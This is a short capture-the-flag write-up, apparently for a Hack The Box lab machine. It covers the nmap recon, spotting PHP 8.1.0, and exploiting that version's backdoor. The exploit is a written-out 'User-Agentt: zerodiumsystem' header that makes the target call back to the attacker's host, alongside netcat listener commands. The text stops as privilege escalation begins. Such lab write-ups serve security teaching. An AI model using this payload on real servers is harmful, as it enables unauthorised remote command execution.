![knife](https://user-images.githubusercontent.com/66635295/183265217-40705451-47ef-47ea-ab35-e26165b77ea1.png)

**RECON**
---
**Medical Website** 

![recon](https://user-images.githubusercontent.com/66635295/185769120-78ab97a6-f512-4208-880a-3c05f2264f0d.png)

**Nmap Scan**

<pre>nmap -sC -sV 10.10.10.242</pre>

![nmap](https://user-images.githubusercontent.com/66635295/185769407-f6fd4c5b-cc7c-4ab8-b531-6e88f3b1e6bd.png)

**PHP Website**

![php site](https://user-images.githubusercontent.com/66635295/185770395-1da8cbb3-7ce3-4c36-8c2e-8103db704f6c.png)

Inspecting Network Properties reveals PHP 8.1.0

![php8](https://user-images.githubusercontent.com/66635295/185770435-9126406a-dd13-418f-87da-95be53733ccf.png)

**PHP Exploit**
![exploit](https://user-images.githubusercontent.com/66635295/185770641-fa1b43d7-afe9-4069-851a-d3b633694832.png)

![exploit info](https://user-images.githubusercontent.com/66635295/185770464-7a2eba76-ab51-4165-b925-18a0448de67f.png)

**ENUMERATION**
---
**Netcat listner**

<pre>nc -lvnp 80</pre>

![nc](https://user-images.githubusercontent.com/66635295/185774526-17ee8bd6-3db1-44cd-961f-4246e53ce9d5.png)

**Burp Repeater**

<pre> User-Agentt: zerodiumsystem('usr/bin/curl 10.10.14.4'); </pre>

![zerodium](https://user-images.githubusercontent.com/66635295/185774591-d979f520-60a7-43d4-b42d-3e1b4f9eea04.png)

**Curl Success**

![curld](https://user-images.githubusercontent.com/66635295/185774707-6bb92e13-f96f-4dce-9302-b157f3ea6507.png)


**PRIVILEGE ESCALATION**
---

**Open second listner**

<pre>nc -lvnp 4444</pre>

![n4444](https://user-images.githubusercontent.com/66635295/185774762-588516b5-2335-43dc-83d6-177614124790.png)
